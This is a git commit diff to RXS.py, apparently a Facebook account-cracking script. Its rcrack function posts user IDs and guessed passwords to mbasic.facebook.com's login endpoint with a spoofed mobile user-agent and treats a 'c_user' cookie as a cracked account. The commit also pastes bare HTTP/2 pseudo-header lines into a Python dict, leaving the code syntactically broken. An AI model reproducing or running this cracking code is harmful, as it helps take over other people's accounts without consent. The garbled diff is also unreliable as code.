21225676e0274af28c4c93e449af487b91b0532d
RJ SHANTO <124341668+hridoyshanto@users.noreply.github.com>
2023-04-24 11:13:18 +0600

    Add files via upload

--- RXS.py
+++ RXS.py
@@ -206,6 +206,9 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             headers = {'authority': 'mbasic.facebook.com',
+    :method: GET
+    :path: /
+    :scheme: https
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
     'cache-control': 'max-age=0',
@@ -219,7 +222,6 @@ def rcrack(uid,pwx,tl):
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)',
 }
-
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
